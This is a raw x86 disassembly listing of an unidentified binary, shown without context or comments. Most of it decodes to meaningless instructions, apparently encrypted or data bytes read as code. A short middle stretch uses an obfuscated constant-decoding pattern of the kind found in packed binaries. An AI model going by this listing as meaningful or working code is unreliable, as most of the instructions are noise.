  40fdd8:	fld    QWORD PTR [ecx+0x20]
  40fddb:	mov    ah,0x8b
  40fddd:	test   BYTE PTR [ebx+eax*4-0x48df79d5],ah
  40fde4:	xor    dh,dh
  40fde6:	imul   edx,DWORD PTR [eax+0x5d],0x684e2d4d
  40fded:	sbb    eax,0xe75cfd1a
  40fdf2:	or     BYTE PTR [ecx+0x1e],0x74
  40fdf6:	cmp    DWORD PTR [edi+0x2],ebx
  40fdf9:	push   edx
  40fdfa:	xchg   esp,eax
  40fdfb:	out    dx,al
  40fdfc:	xchg   ebx,eax
  40fdfd:	jb     0x40fd99
  40fdff:	mov    bl,bl
  40fe01:	cmp    bh,BYTE PTR [ebp-0x63]
  40fe04:	dec    esi
  40fe05:	mov    al,ds:0x45c75ad8
  40fe0a:	mov    ebp,DWORD PTR cs:[edi]
  40fe0d:	push   ecx
  40fe0e:	mov    bh,0x86
  40fe10:	jge    0x40fe7f
  40fe12:	popa   
  40fe13:	sbb    dl,cl
  40fe15:	ret    
  40fe16:	fisttp DWORD PTR [edi]
  40fe18:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fe19:	imul   ecx,DWORD PTR [eax],0xffffffcb
  40fe1c:	inc    eax
  40fe1d:	repnz pushf 
  40fe1f:	out    0x7b,eax
  40fe21:	mov    esp,0x8a67d638
  40fe26:	in     al,dx
  40fe27:	out    0xbb,eax
  40fe29:	mov    al,0x75
  40fe2b:	(bad)  
  40fe2c:	mov    eax,ds:0x468744d4
  40fe31:	sub    edi,esi
  40fe33:	cmp    DWORD PTR [esi],0xffffffe2
  40fe36:	sub    eax,0xc89fccd9
  40fe3b:	jne    0x40fdc5
  40fe3d:	out    0xa3,al
  40fe3f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fe40:	cli    
  40fe41:	and    BYTE PTR [ebx-0x1f9a4057],0x81
  40fe48:	lds    esp,FWORD PTR [ebx-0x40]
  40fe4b:	int    0x8a
  40fe4d:	adc    eax,0x38bcc799
  40fe52:	xor    edi,DWORD PTR [esi-0x60070065]
  40fe58:	xor    eax,DWORD PTR [ebp+0x66]
  40fe5b:	test   eax,0x61a7772
  40fe60:	or     eax,0x8c7fd54a
  40fe65:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fe66:	lock out dx,al
  40fe68:	les    ecx,FWORD PTR [edi+0x12361bb6]
  40fe6e:	inc    esi
  40fe6f:	je     0x40fed1
  40fe71:	aad    0xf9
  40fe73:	push   esp
  40fe74:	jle    0x40fe10
  40fe76:	cwde   
  40fe77:	fisubr DWORD PTR fs:[esi-0xa]
  40fe7b:	inc    ebp
  40fe7c:	loopne 0x40fe12
  40fe7e:	inc    edx
  40fe7f:	pop    ss
  40fe80:	pop    eax
  40fe81:	loope  0x40fe52
  40fe83:	in     eax,0x4b
  40fe85:	jbe    0x40feb1
  40fe87:	inc    ebx
  40fe88:	push   esi
  40fe89:	xchg   ebx,eax
  40fe8a:	sbb    eax,0xbdad1d78
  40fe8f:	fld    TBYTE PTR [ebx-0x4bd7806]
  40fe95:	out    dx,al
  40fe96:	mov    bl,0x11
  40fe98:	dec    edi
  40fe99:	stc    
  40fe9a:	nop
  40fe9b:	call   0x7d205776
  40fea0:	lds    edi,FWORD PTR ds:0x70dcde77
  40fea6:	and    BYTE PTR [eax+0x28],dl
  40fea9:	pusha  
  40feaa:	retf   
  40feab:	scas   eax,DWORD PTR es:[edi]
  40feac:	shr    dh,1
  40feae:	jle    0x40feea
  40feb0:	jno    0x40fe63
  40feb2:	add    al,0x5f
  40feb4:	loop   0x40fe7b
  40feb6:	adc    al,0x12
  40feb8:	test   eax,0xac82ec0
  40febd:	dec    esp
  40febe:	push   edx
  40febf:	pop    ebp
  40fec0:	cs adc al,0xb4
  40fec3:	ss mov ecx,0xc0bbdd2f
  40fec9:	jno    0x40fe77
  40fecb:	jl     0x40ff03
  40fecd:	repnz inc eax
  40fecf:	xlat   BYTE PTR ds:[ebx]
  40fed0:	sub    DWORD PTR [esi],ebp
  40fed2:	mov    dh,0xa6
  40fed4:	ret    
  40fed5:	in     al,0x1b
  40fed7:	loope  0x40fed1
  40fed9:	mov    DWORD PTR [edi+0x3aaa847a],edi
  40fedf:	add    ch,BYTE PTR [ecx]
  40fee1:	addr16 mov ecx,0xc131989
  40fee7:	xor    BYTE PTR [eax],cl
  40fee9:	in     al,dx
  40feea:	enter  0x863e,0x34
  40feee:	setno  BYTE PTR [edx+0x2e]
  40fef2:	xor    eax,0x65a7b036
  40fef7:	pop    esp
  40fef8:	lds    ebx,FWORD PTR [ecx+0xc0259a8]
  40fefe:	scas   al,BYTE PTR es:[edi]
  40feff:	loope  0x40fedf
  40ff01:	inc    ecx
  40ff02:	(bad)  
  40ff03:	and    esp,DWORD PTR [eax+0x6e]
  40ff06:	sti    
  40ff07:	add    al,0xe4
  40ff09:	pop    ebx
  40ff0a:	xor    edx,ebx
  40ff0c:	or     ch,dl
  40ff0e:	push   eax
  40ff0f:	pop    esi
  40ff10:	stos   DWORD PTR es:[edi],eax
  40ff11:	repz mov dl,0x8
  40ff14:	scas   eax,DWORD PTR es:[edi]
  40ff15:	pushf  
  40ff16:	and    bh,cl
  40ff18:	or     eax,0x988b67cc
  40ff1d:	int    0x69
  40ff1f:	ret    0x97e9
  40ff22:	leave  
  40ff23:	push   ebp
  40ff24:	or     al,BYTE PTR [eax+0x8d6b42c]
  40ff2a:	retf   
  40ff2b:	daa    
  40ff2c:	leave  
  40ff2d:	xchg   esi,eax
  40ff2e:	pop    edx
  40ff2f:	fist   WORD PTR [edx]
  40ff31:	sub    ecx,eax
  40ff33:	pop    ebx
  40ff34:	xchg   esi,eax
  40ff35:	call   FWORD PTR [esi]
  40ff37:	js     0x40ff53
  40ff39:	stc    
  40ff3a:	and    BYTE PTR [edx+0x29],0x59
  40ff3e:	(bad)  
  40ff3f:	and    bh,BYTE PTR [eax+edi*4-0x2de67cbb]
  40ff46:	out    dx,eax
  40ff47:	xchg   edx,eax
  40ff48:	cli    
  40ff49:	jbe    0x40ff4e
  40ff4b:	adc    eax,0xb575664e
  40ff50:	clc    
  40ff51:	jle    0x40ff9e
  40ff53:	int    0x97
  40ff55:	cmc    
  40ff56:	neg    dl
  40ff58:	xchg   edx,eax
  40ff59:	xor    esi,esi
  40ff5b:	imul   ebp,ebx,0xfffffff9
  40ff5e:	popf   
  40ff5f:	sti    
  40ff60:	stos   BYTE PTR es:[edi],al
  40ff61:	xchg   ecx,eax
  40ff62:	mov    ds:0xd75219d6,eax
  40ff67:	pop    ecx
  40ff68:	inc    esi
  40ff69:	jno    0x40ff11
  40ff6b:	and    edi,edx
  40ff6d:	loop   0x40ff91
  40ff6f:	mov    ecx,0xb4a8ff0d
  40ff74:	jmp    0xab5d:0x39cbd3c2
  40ff7b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ff7c:	push   0xebf4865f
  40ff81:	push   esi
  40ff82:	xor    esi,DWORD PTR [ebp-0x13]
  40ff85:	or     dh,BYTE PTR [esi]
  40ff87:	push   ss
  40ff88:	in     eax,0x6f
  40ff8a:	add    al,0x9d
  40ff8c:	xor    al,0x32
  40ff8e:	cmp    DWORD PTR [esi-0x1a],edx
  40ff91:	std    
  40ff92:	std    
  40ff93:	inc    ebp
  40ff94:	out    0xa7,eax
  40ff96:	jmp    0xdf21c048
  40ff9b:	popf   
  40ff9c:	shl    BYTE PTR [eax-0x2b],1
  40ff9f:	(bad)  
  40ffa0:	hlt    
  40ffa1:	(bad)  
  40ffa2:	(bad)  
  40ffa3:	outs   dx,DWORD PTR ds:[esi]
  40ffa4:	push   esp
  40ffa5:	data16 sti 
  40ffa7:	mov    ds,WORD PTR [edi+0x5d]
  40ffaa:	in     al,0x7e
  40ffac:	out    0xde,eax
  40ffae:	pop    edi
  40ffaf:	xor    ebx,DWORD PTR [ecx-0x25]
  40ffb2:	jp     0x40ff5e
  40ffb4:	sub    dh,BYTE PTR [edx]
  40ffb6:	jmp    0xae0b2942
  40ffbb:	cdq    
  40ffbc:	fadd   DWORD PTR [edx-0x175486e1]
  40ffc2:	jne    0x40ffd5
  40ffc4:	mov    fs,WORD PTR [ebx+eiz*2-0x23]
  40ffc8:	push   cs
  40ffc9:	rol    BYTE PTR [edi+ecx*8-0x76],0xb
  40ffce:	cmp    esp,DWORD PTR [ecx-0x3e]
  40ffd1:	add    ah,bh
  40ffd3:	xor    DWORD PTR [eax-0x6962074a],eax
  40ffd9:	les    edx,FWORD PTR [edx-0x2]
  40ffdc:	dec    ah
  40ffde:	fistp  QWORD PTR [edx+eax*8]
  40ffe1:	out    dx,eax
  40ffe2:	jp     0x40ffc5
  40ffe4:	add    DWORD PTR [ecx+eax*1-0x5a],ebx
  40ffe8:	dec    esp
  40ffe9:	mov    DWORD PTR [ebx],ebx
  40ffeb:	xchg   ebp,eax
  40ffec:	or     DWORD PTR [ecx],ebp
  40ffee:	push   ds
  40ffef:	xchg   edi,eax
  40fff0:	sbb    BYTE PTR [esi],ch
  40fff2:	xor    BYTE PTR [edi],dl
  40fff4:	push   ds
  40fff5:	adc    al,0x16
  40fff7:	out    dx,al
  40fff8:	mov    ds:0x9a5df65,al
  40fffd:	adc    DWORD PTR [edi],ebx
  40ffff:	js     0x410063
  410001:	mov    ?,esp
  410003:	popf   
  410004:	or     eax,0xe14a5230
  410009:	jg     0x410080
  41000b:	pop    es
  41000c:	mov    esp,0xf793e1eb
  410011:	jmp    0x93466de3
  410016:	(bad)  [edx+0x5d19f6dc]
  41001c:	push   esp
  41001d:	mov    WORD PTR [edi-0x3fee446a],?
  410023:	jae    0x40fff9
  410025:	sub    BYTE PTR [eax-0x36bbb6fb],dl
  41002b:	outs   dx,DWORD PTR ds:[esi]
  41002c:	scas   eax,DWORD PTR es:[edi]
  41002d:	jbe    0x4100aa
  41002f:	xchg   ebp,eax
  410030:	mov    esi,0xa919bb47
  410035:	fadd   DWORD PTR [edx+0x69]
  410038:	ftst   
  41003a:	(bad)  
  41003b:	call   0x60f36249
  410040:	or     ebx,DWORD PTR [eax]
  410042:	pop    esp
  410043:	ror    DWORD PTR [ecx-0xf],1
  410046:	(bad)  
  410047:	aam    0x81
  410049:	jge    0x40ffd1
  41004b:	mov    ecx,0xae4a0202
  410050:	shl    eax,0x1a
  410053:	js     0x41003b
  410055:	adc    eax,DWORD PTR [ecx+0x22]
  410058:	mov    ah,0x21
  41005a:	xchg   ebx,eax
  41005b:	push   edi
  41005c:	jmp    0x2e24:0x119eb079
  410063:	out    0x96,eax
  410065:	sbb    al,0x12
  410067:	fistp  QWORD PTR [edx]
  410069:	rep ins BYTE PTR es:[edi],dx
  41006b:	jle    0x410097
  41006d:	pop    eax
  41006e:	daa    
  41006f:	adc    al,0xb8
  410071:	cli    
  410072:	mov    esp,0xe3a29530
  410077:	in     al,dx
  410078:	iret   
  410079:	jnp    0x410022
  41007b:	int    0x3d
  41007d:	icebp  
  41007e:	jmp    0x981d4492
  410083:	sbb    DWORD PTR [ebx+0x5e],eax
  410086:	cmp    bh,cl
  410088:	pop    eax
  410089:	jmp    0x64ea:0xcd027631
  410090:	enter  0x4f93,0x47
  410094:	icebp  
  410095:	mov    eax,ds:0x45bed0aa
  41009a:	push   cs
  41009b:	aad    0xe8
  41009d:	jp     0x4100a2
  41009f:	and    DWORD PTR [eax+ebx*4],ebp
  4100a2:	int3   
  4100a3:	les    ecx,FWORD PTR [ebx+edi*2+0x72d2f5e3]
  4100aa:	add    DWORD PTR [edx+0xe],edi
  4100ad:	cdq    
  4100ae:	cld    
  4100af:	mov    al,ds:0xd9f70277
  4100b4:	fist   DWORD PTR [esi+0x3db36562]
  4100ba:	icebp  
  4100bb:	and    bl,BYTE PTR [ebx+0x2e]
  4100be:	cmp    BYTE PTR [ecx+esi*8+0x3441febf],dh
  4100c5:	push   esi
  4100c6:	shl    BYTE PTR [eax],cl
  4100c8:	dec    edx
  4100c9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4100ca:	cld    
  4100cb:	jae    0x410094
  4100cd:	sbb    eax,0xfd70b0b0
  4100d2:	xchg   BYTE PTR [bp+0x5],ah
  4100d6:	cld    
  4100d7:	or     eax,0x7b45ede7
  4100dc:	mov    bh,0xf5
  4100de:	loopne 0x410098
  4100e0:	jle    0x4100bf
  4100e2:	cmp    BYTE PTR [esi+0x38c98222],ch
  4100e8:	data16 xchg BYTE PTR [edx-0x37],bh
  4100ec:	fs loope 0x410123
  4100ef:	lock jnp 0x4100dc
  4100f2:	test   al,0x15
  4100f4:	sub    al,0x94
  4100f6:	outs   dx,DWORD PTR ds:[esi]
  4100f7:	pop    ebp
  4100f8:	jno    0x410115
  4100fa:	push   eax
  4100fb:	push   edi
  4100fc:	pop    edx
  4100fd:	adc    ah,bl
  4100ff:	mov    dl,0xea
  410101:	aaa    
  410102:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410103:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410104:	lods   al,BYTE PTR ds:[esi]
  410105:	pop    ecx
  410106:	test   al,0x7d
  410108:	mov    edi,0xa60c75c3
  41010d:	inc    eax
  41010e:	test   eax,0x168ec197
  410113:	push   0xffffffe1
  410115:	or     al,0x18
  410117:	imul   BYTE PTR [eax]
  410119:	mov    dh,0x42
  41011b:	(bad)  
  41011c:	adc    al,0xbb
  41011e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41011f:	jle    0x410177
  410121:	mov    ch,0x6b
  410123:	mov    bh,0xc3
  410125:	and    bl,BYTE PTR [edi-0x13ff0fb2]
  41012b:	scas   al,BYTE PTR es:[edi]
  41012c:	and    BYTE PTR [ebp-0x46],bh
  41012f:	repnz sub al,0x54
  410132:	sub    BYTE PTR [edi-0x39],0xba
  410136:	gs aad 0xf9
  410139:	xor    edx,DWORD PTR [edi+0x57a85b30]
  41013f:	test   BYTE PTR [ecx-0x13cabd81],bh
  410145:	loop   0x4100eb
  410147:	loope  0x410155
  410149:	inc    ebp
  41014a:	cmp    esp,DWORD PTR ds:0x41ffcf68
  410150:	js     0x4100d3
  410152:	inc    esi
  410153:	(bad)  
  410154:	(bad)  
  410155:	or     al,0x39
  410157:	jb     0x4101c9
  410159:	mul    BYTE PTR [esi-0x2839d035]
  41015f:	dec    esi
  410160:	add    ecx,DWORD PTR [ecx]
  410162:	mov    al,BYTE PTR [edi-0x18]
  410165:	adc    ebp,DWORD PTR [edx+ebp*1+0x51]
  410169:	push   ds
  41016a:	and    al,0x88
  41016c:	inc    esi
  41016d:	aad    0x5e
  41016f:	xchg   DWORD PTR [ebx+0x6b8b5c75],eax
  410175:	xchg   ebp,eax
  410176:	sbb    edi,DWORD PTR [ebp+0x35f3f1df]
  41017c:	xchg   edx,eax
  41017d:	mov    ch,0x84
  41017f:	cmp    eax,0x63b15b91
  410184:	cmp    eax,0x9fd4939f
  410189:	dec    ebp
  41018a:	daa    
  41018b:	adc    eax,0xc8f1e814
  410190:	fidivr DWORD PTR [ebx+0x63]
  410193:	loop   0x4101b5
  410195:	cli    
  410196:	lahf   
  410197:	push   ss
  410198:	cs jecxz 0x4101e4
  41019b:	xchg   ecx,eax
  41019c:	cmp    BYTE PTR [edi-0x24],cl
  41019f:	lock push 0xf4e1a265
  4101a5:	in     al,dx
  4101a6:	test   esp,0x4802e5f9
  4101ac:	xchg   ecx,eax
  4101ad:	std    
  4101ae:	and    BYTE PTR [eax-0x5b],al
  4101b1:	sbb    edi,DWORD PTR ds:0x614ab1c2
  4101b7:	and    al,0x27
  4101b9:	push   edx
  4101ba:	mov    bl,0xeb
  4101bc:	xor    bl,BYTE PTR [bp+si-0x4c]
  4101c0:	mov    ds:0x9282d2c6,eax
  4101c5:	sub    ecx,DWORD PTR [ebx-0x6e]
  4101c8:	mov    edi,0xc5422925
  4101cd:	es mov ecx,0x3549a90a
  4101d3:	pop    es
  4101d4:	retf   0xbf83
  4101d7:	int    0xdc
  4101d9:	(bad)  
  4101da:	push   edx
  4101db:	dec    ecx
  4101dc:	add    dl,ch
  4101de:	add    edi,DWORD PTR [eax+0x79c1de08]
  4101e4:	or     eax,0xbdd19070
  4101e9:	mov    bh,0x84
  4101eb:	mov    bh,0xe6
  4101ed:	out    0xde,eax
  4101ef:	jae    0x41019f
  4101f1:	xor    eax,DWORD PTR [esi+0x2a33c125]
  4101f7:	cwde   
  4101f8:	xchg   DWORD PTR [eax-0x53],edi
  4101fb:	cmp    DWORD PTR [ecx],esp
  4101fd:	adc    esi,edi
  4101ff:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410200:	mov    edi,0xe6ff89e8
  410205:	or     dh,BYTE PTR [ecx-0x28]
  410208:	mov    ebx,0x7f5d345e
  41020d:	sbb    eax,0xfd6c43f5
  410212:	fbstp  TBYTE PTR [ecx+0x452062d2]
  410218:	int3   
  410219:	adc    DWORD PTR [eax-0x59fae133],esi
  41021f:	cmp    al,BYTE PTR [ecx-0x39]
  410222:	push   ds
  410223:	mov    eax,fs:0xa9bdf3b7
  410229:	and    ebx,ebx
  41022b:	ins    DWORD PTR es:[edi],dx
  41022c:	inc    ecx
  41022d:	or     BYTE PTR [ebx+eax*4-0x19648bc7],al
  410234:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410235:	and    ah,BYTE PTR [edx]
  410237:	fiadd  WORD PTR [ecx+0x3e]
  41023a:	mov    esi,0xfc70331
  41023f:	scas   eax,DWORD PTR es:[edi]
  410240:	ret    
  410241:	cmp    eax,edx
  410243:	ja     0x4191d2
  410249:	mov    edx,DWORD PTR [ebp-0x10]
  41024c:	mov    eax,DWORD PTR [ebp-0x14]
  41024f:	mov    ebx,DWORD PTR [ebp-0x28]
  410252:	sub    eax,edx
  410254:	xor    ebx,esi
  410256:	xor    edx,edx
  410258:	add    ebx,edi
  41025a:	div    ebx
  41025c:	mov    DWORD PTR [ebp-0x8],eax
  41025f:	mov    eax,DWORD PTR [ebp-0x2c]
  410262:	mov    edx,DWORD PTR [ebp-0x8]
  410265:	xor    eax,esi
  410267:	add    eax,edi
  410269:	cmp    edx,eax
  41026b:	jbe    0x41027b
  410271:	mov    eax,DWORD PTR [ebp-0x2c]
  410274:	xor    eax,esi
  410276:	add    eax,edi
  410278:	mov    DWORD PTR [ebp-0x8],eax
  41027b:	mov    eax,DWORD PTR [ebp-0x28]
  41027e:	mov    edx,DWORD PTR [ebp-0x8]
  410281:	xor    eax,esi
  410283:	add    eax,edi
  410285:	imul   eax,edx
  410288:	mov    DWORD PTR [ebp-0x8],eax
  41028b:	mov    eax,DWORD PTR [ebp-0x3c]
  41028e:	mov    edx,DWORD PTR [ebp-0x8]
  410291:	xor    eax,esi
  410293:	add    eax,edi
  410295:	cmp    edx,eax
  410297:	je     0x4191bb
  41029d:	mov    eax,DWORD PTR [ebp-0x8]
  4102a0:	mov    DWORD PTR [ebp-0x20],eax
  4102a3:	mov    eax,DWORD PTR [ebp-0x10]
  4102a6:	add    eax,DWORD PTR [ebp-0x40]
  4102a9:	mov    DWORD PTR [ebp-0x24],0xf89c85b6
  4102b0:	mov    DWORD PTR [ebp-0x8],eax
  4102b3:	mov    eax,0xf89c85b5
  4102b8:	mov    DWORD PTR [ebp-0x1c],eax
  4102bb:	mov    DWORD PTR [ebp-0x38],0xf89c85b4
  4102c2:	mov    DWORD PTR [ebp-0x30],eax
  4102c5:	mov    eax,DWORD PTR [ebp-0x24]
  4102c8:	xor    eax,esi
  4102ca:	add    eax,edi
  4102cc:	jmp    0x416dfa
  4102d1:	mov    DWORD PTR [ebp-0x48],0xf89c85be
  4102d8:	mov    DWORD PTR [ebp-0x4c],0xf89c85a1
  4102df:	mov    eax,DWORD PTR [ebp-0x30]
  4102e2:	mov    edx,DWORD PTR [ebp-0xc]
  4102e5:	xor    eax,esi
  4102e7:	add    eax,edi
  4102e9:	imul   eax,edx
  4102ec:	mov    edx,DWORD PTR [ebp-0x1c]
  4102ef:	xor    edx,esi
  4102f1:	add    eax,edx
  4102f3:	mov    edx,DWORD PTR [ebp-0x8]
  4102f6:	mov    al,BYTE PTR [eax+edx*1+0x3272db]
  4102fd:	mov    BYTE PTR [ebp-0x1],al
  410300:	mov    eax,DWORD PTR [ebp-0x1c]
  410303:	mov    edx,DWORD PTR [ebp-0x1c]
  410306:	xor    eax,esi
  410308:	xor    edx,esi
  41030a:	lea    ebx,[eax+edx*1+0x64e5b6]
  410311:	mov    eax,DWORD PTR [ebp-0xc]
  410314:	xor    edx,edx
  410316:	div    ebx
  410318:	mov    eax,DWORD PTR [ebp-0x1c]
  41031b:	xor    eax,esi
  41031d:	add    eax,edi
  41031f:	cmp    edx,eax
  410321:	mov    eax,DWORD PTR [ebp-0x30]
  410324:	mov    edx,DWORD PTR [ebp-0xc]
  410327:	jmp    0x41269c
  41032c:	lods   al,BYTE PTR ds:[esi]
  41032d:	jbe    0x410322
  41032f:	loop   0x4102d4
  410331:	jmp    DWORD PTR [ebx-0x2d50dedc]
  410337:	into   
  410338:	cmp    eax,0xbf307de5
  41033d:	mov    fs,WORD PTR [edx+0x62]
  410340:	or     bl,BYTE PTR [edi+0x62]
  410343:	(bad)  
  410344:	lock mov eax,ds:0xf95872a4
  41034a:	pop    esi
  41034b:	mov    BYTE PTR [ecx-0x4d],ch
  41034e:	pop    esi
  41034f:	inc    esp
  410350:	repnz pop es
  410352:	(bad)  
  410353:	stos   DWORD PTR es:[edi],eax
  410354:	jae    0x410338
  410356:	iret   
  410357:	in     al,0xed
  410359:	shl    BYTE PTR [ecx+ecx*8],1
  41035c:	cmp    eax,0xa0f51d64
  410361:	pop    esi
  410362:	stc    
  410363:	sbb    eax,0x7e510686
  410368:	pop    ds
  410369:	pop    esi
  41036a:	lock xchg DWORD PTR [edx],edx
  41036d:	pop    eax
  41036e:	out    dx,eax
  41036f:	into   
  410370:	sbb    eax,0x96b9f268
  410375:	push   esp
  410376:	dec    eax
  410377:	or     al,0xea
  410379:	pop    ds
  41037a:	dec    ecx
  41037b:	sbb    eax,DWORD PTR ds:0x616e8312
  410381:	xor    eax,0x355f9028
  410386:	cli    
  410387:	inc    ebx
  410388:	xlat   BYTE PTR ds:[ebx]
  410389:	aam    0x52
  41038b:	bound  ebx,QWORD PTR [edi]
  41038d:	pop    ebx
  41038e:	dec    eax
  41038f:	cdq    
  410390:	les    ecx,FWORD PTR [ecx+0x3]
  410393:	xchg   edx,eax
  410394:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410395:	mov    DWORD PTR [edx+0x4881532],0x3244270f
  41039f:	xor    al,0xc6
  4103a1:	(bad)  
  4103a2:	gs and al,0xea
  4103a5:	cmc    
  4103a6:	jne    0x41041e
  4103a8:	inc    ebx
  4103a9:	jmp    0xbc9b6699
  4103ae:	mov    ebp,0xb52833d3
  4103b3:	mov    ch,0xaa
  4103b5:	popa   
  4103b6:	cld    
  4103b7:	imul   ebx,DWORD PTR [edi+0x6d2295f3],0xffffffb1
  4103be:	and    al,0x64
  4103c0:	mov    bl,0xc2
  4103c2:	pop    esp
  4103c3:	ins    DWORD PTR es:[edi],dx
  4103c4:	pop    esi
  4103c5:	jmp    0xb34a:0xe23786fe
  4103cc:	popf   
  4103cd:	je     0x41043e
  4103cf:	sub    ebp,DWORD PTR [esi+0x48d67882]
  4103d5:	inc    edi
  4103d6:	ins    DWORD PTR es:[edi],dx
  4103d7:	nop
  4103d8:	xchg   dh,ch
  4103da:	push   esi
  4103db:	es xor al,0x6d
  4103de:	push   0xffffffee
  4103e0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4103e1:	adc    cl,BYTE PTR [ecx-0x11]
  4103e4:	dec    esi
  4103e5:	mov    al,0x17
  4103e7:	in     eax,0xe2
  4103e9:	sub    bl,BYTE PTR [eax]
  4103eb:	(bad)  
  4103ec:	fcomp  st(7)
  4103ee:	mov    ebp,0xf0c0f7c9
  4103f3:	outs   dx,BYTE PTR ds:[esi]
  4103f4:	push   eax
  4103f5:	inc    eax
  4103f6:	xchg   ecx,eax
  4103f7:	or     al,0xd8
  4103f9:	sub    ah,al
  4103fb:	mov    bh,0x7c
  4103fd:	push   esi
  4103fe:	push   ss
  4103ff:	dec    esp
  410400:	repz call 0xfb1ecf31
  410406:	out    0x50,al
  410408:	or     eax,0x1ce63c1b
  41040d:	dec    ebp
  41040e:	sub    DWORD PTR [esi+ebp*2],esi
  410411:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410412:	shr    DWORD PTR [ebx],cl
  410414:	add    al,0x84
  410416:	repnz ins DWORD PTR es:[edi],dx
  410418:	sahf   
  410419:	xor    eax,0xa10fe78b
  41041e:	cli    
  41041f:	(bad)  
  410420:	(bad)  
  410421:	fiadd  WORD PTR [ebp+0x39]
  410424:	push   eax
  410425:	mov    ebx,0xb90ff507
  41042a:	add    al,0x9f
  41042c:	mov    edi,0x14219ef
  410431:	mov    esp,0x295f7680
  410436:	mov    ch,0xba
  410438:	mul    ah
  41043a:	sub    ah,bh
  41043c:	mov    ecx,0x664b6fde
  410441:	add    bl,cl
  410443:	and    dl,al
  410445:	mov    edx,0x6e7ac95
  41044a:	pop    eax
  41044b:	repz adc bl,ch
  41044e:	xor    ah,BYTE PTR [ebx+0x4c0b5c03]
  410454:	adc    esp,ebx
  410456:	dec    esi
  410457:	popf   
  410458:	int    0xa9
  41045a:	adc    BYTE PTR [ebp-0x53],ch
  41045d:	cmp    al,0x9a
  41045f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410460:	(bad)  
  410461:	jmp    0x41042a
  410463:	call   0xa5389396
  410468:	jmp    0x76ecddf6
  41046d:	or     dl,BYTE PTR ss:[edx]
  410470:	pop    esi
  410471:	add    DWORD PTR [eax-0x68290b06],0xd831d1c3
  41047b:	aam    0x58
  41047d:	mov    edx,DWORD PTR [ecx+0x292d55c0]
  410483:	leave  
  410484:	add    eax,0x2f140ad1
  410489:	cmp    ebx,DWORD PTR [esi+edx*2-0x6be05c4d]
  410490:	in     al,dx
  410491:	add    bl,dl
  410493:	mov    bl,0x43
  410495:	push   eax
  410496:	in     al,0x5
  410498:	push   edx
  410499:	stos   BYTE PTR es:[edi],al
  41049a:	jmp    0xef97:0x9de15540
  4104a1:	clc    
  4104a2:	sbb    al,bl
  4104a4:	xor    ch,BYTE PTR cs:[eax+0x6fcf053d]
  4104ab:	out    0x45,eax
  4104ad:	ret    
  4104ae:	cli    
  4104af:	stos   BYTE PTR es:[edi],al
  4104b0:	sar    DWORD PTR [ebx+0x31],cl
  4104b3:	andnps xmm4,XMMWORD PTR [ecx-0x2f11e2ca]
  4104ba:	pop    esp
  4104bb:	adc    DWORD PTR [edx-0x69],ebx
  4104be:	mov    BYTE PTR [ebp-0x265505e4],al
  4104c4:	(bad)  
  4104c5:	jnp    0x4104fd
  4104c7:	cmp    esi,edx
  4104c9:	jmp    0x2b00:0x4b9c54c
  4104d0:	or     al,0x27
  4104d2:	das    
  4104d3:	mov    ebp,0x10a4990e
  4104d8:	sbb    DWORD PTR [edx+0x70],esp
  4104db:	cli    
  4104dc:	ror    BYTE PTR [ebx],0x98
  4104df:	ins    BYTE PTR es:[edi],dx
  4104e0:	mov    eax,eax
  4104e2:	js     0x4104b3
  4104e4:	jne    0x4104d9
  4104e6:	add    eax,0x4cb4c4dc
  4104eb:	dec    ebx
  4104ec:	enter  0x66ed,0x45
  4104f0:	dec    edx
  4104f1:	data16 cli 
  4104f3:	mov    esp,0xd698af12
  4104f8:	popf   
  4104f9:	xor    bh,BYTE PTR [ebx-0x3438f5d0]
  4104ff:	psubd  mm5,QWORD PTR [edx+esi*4-0x3939bb2d]
  410507:	jp     0x41048e
  410509:	push   si
  41050b:	out    0x60,eax
  41050d:	adc    eax,0x76c25c57
  410512:	lods   al,BYTE PTR ds:[esi]
  410513:	adc    DWORD PTR [ebx],edi
  410515:	scas   al,BYTE PTR es:[edi]
  410516:	pop    edx
  410517:	call   0xbb25:0x6fe54ea6
  41051e:	jp     0x41050f
  410520:	xchg   edi,eax
  410521:	mov    ebx,0x799dab35
  410526:	or     bl,bh
  410528:	sbb    BYTE PTR [eax],ah
  41052a:	fstp   TBYTE PTR [ebx-0x5c]
  41052d:	int3   
  41052e:	xchg   BYTE PTR [ebp+0x21],ah
  410531:	fild   DWORD PTR [ebp+0x184b21d7]
  410537:	push   cs
  410538:	dec    ecx
  410539:	inc    edi
  41053a:	inc    ecx
  41053b:	mov    bl,0xe8
  41053d:	lods   al,BYTE PTR ds:[esi]
  41053e:	push   0x766ee9c8
  410543:	aaa    
  410544:	dec    ebx
  410545:	loopne 0x410552
  410547:	test   ah,dl
  410549:	pop    eax
  41054a:	fnstcw WORD PTR [eax+0x16]
  41054d:	fistp  WORD PTR [eax]
  41054f:	jne    0x4105a2
  410551:	pop    ebx
  410552:	cmp    DWORD PTR [edx+0x70],esi
  410555:	lahf   
  410556:	push   ebp
  410557:	inc    ebp
  410558:	jl     0x4104e3
  41055a:	repz and eax,0xd1633576
  410560:	add    edx,ecx
  410562:	stos   DWORD PTR es:[edi],eax
  410563:	push   0xb174e0c0
  410568:	xchg   ebx,eax
  410569:	aaa    
  41056a:	xor    BYTE PTR [ebp+0x7eadb55c],dl
  410570:	mov    ebx,0x1e7b365b
  410575:	push   es
  410576:	sub    ch,al
  410578:	js     0x4105bf
  41057a:	loope  0x4105be
  41057c:	push   edi
  41057d:	and    esp,esp
  41057f:	ss or  al,0xd7
  410582:	ins    DWORD PTR es:[edi],dx
  410583:	out    dx,al
  410584:	jecxz  0x41058a
  410586:	adc    al,0xfa
  410588:	add    al,BYTE PTR [edi+0x2b]
  41058b:	push   edx
  41058c:	jl     0x4105f3
